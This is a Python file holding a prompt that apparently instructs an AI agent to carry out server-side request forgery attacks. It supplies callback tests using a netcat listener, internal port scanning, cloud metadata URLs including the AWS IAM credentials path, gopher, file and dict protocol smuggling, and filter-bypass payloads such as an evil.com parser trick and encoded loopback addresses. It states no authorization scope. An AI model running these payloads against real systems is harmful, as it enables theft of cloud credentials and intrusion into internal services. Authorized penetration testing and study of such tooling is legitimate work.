"""
SSRF Attack Skill Prompt.
"""

SSRF_SKILL_PROMPT = """
## ATTACK SKILL: SERVER-SIDE REQUEST FORGERY (SSRF)

**CRITICAL: Target has URL-fetching functionality (webhooks, link previews,
importers, proxy endpoints, file fetchers). Follow this SSRF workflow.**

---

### DETECTION: Identify URL-fetching endpoints

Endpoints that suggest SSRF surface:
- `url=`, `fetch=`, `proxy=`, `webhook=`, `callback=`, `redirect=`, `link=`
- File importers: `import_url=`, `upload_from_url=`, `feed=`
- Image processors: `image_url=`, `thumbnail=`, `avatar_url=`
- Any parameter whose value looks like a URL

### MANDATORY SSRF WORKFLOW

#### STEP 1: CONFIRMATION

Set up a listener to receive callbacks:
```
# Terminal 1: start a listener
nc -lvp 8888
# Or use a webhook service like webhook.site, requestbin, interactsh
```

Then test if the target makes outbound requests:
1. `http://YOUR_IP:8888/test` — simple HTTP callback
2. `http://YOUR_IP:8888/{{endpoint}}` — check what path is requested
3. `http://[YOUR_IP]:8888/test` — IPv6 literal (bypass some filters)

If you receive a connection -> SSRF CONFIRMED.

#### STEP 2: INTERNAL SCANNING

Once confirmed, probe internal services:
1. `http://localhost/` — loopback access
2. `http://127.0.0.1/` — explicit loopback
3. `http://0.0.0.0/` — all interfaces
4. `http://[::1]/` — IPv6 loopback
5. `http://localhost:22` — internal SSH
6. `http://localhost:5432` — internal PostgreSQL
7. `http://localhost:6379` — internal Redis
8. `http://localhost:8080` — internal web servers
9. `http://localhost:9200` — internal Elasticsearch
10. `http://169.254.169.254/latest/meta-data/` — AWS metadata (cloud)

**Port scan via SSRF**: Test common internal ports and note response differences:
- Timeout -> port closed
- Connection refused -> port closed (service not listening)
- HTTP response -> port open with web service
- Non-HTTP response -> port open with other service

#### STEP 3: CLOUD METADATA

If the target is cloud-hosted:
- AWS: `http://169.254.169.254/latest/meta-data/`
- AWS IAM creds: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- DigitalOcean: `http://169.254.169.254/metadata/v1.json`

**IMPORTANT**: Cloud metadata endpoints require specific headers:
- GCP: `Metadata-Flavor: Google`
- Azure: `Metadata: true`

#### STEP 4: PROTOCOL SMUGGLING

If HTTP-only SSRF, try protocol smuggling for RCE:
- `gopher://localhost:6379/_INFO` — Redis protocol
- `file:///etc/passwd` — local file read (rarely works)
- `dict://localhost:6379/info` — dict protocol

#### STEP 5: FILTER BYPASSES

If direct requests are blocked:
- DNS rebinding: use a domain that resolves to 127.0.0.1
- URL parser confusion: `http://127.0.0.1:80@evil.com/`
- Double-encoding: `http://127.0.0.1:%38%30/`
- Redirect chains: have your server 302-redirect to internal IPs
- IPv6/IPv4 mix: `http://[::ffff:127.0.0.1]/`
- Decimal IP: `http://2130706433/` (= 127.0.0.1)
- Hex IP: `http://0x7f000001/`
- DNS A record pointing to 127.0.0.1 (use nip.io: `http://127.0.0.1.nip.io/`)

#### ANTI-PATTERNS:
- Do NOT claim SSRF unless you receive a callback or see internal data
- Do NOT stop after one internal URL fails — scan multiple ports
- Always check cloud metadata if the target might be cloud-hosted
- Record every internal endpoint discovered with write_note
"""
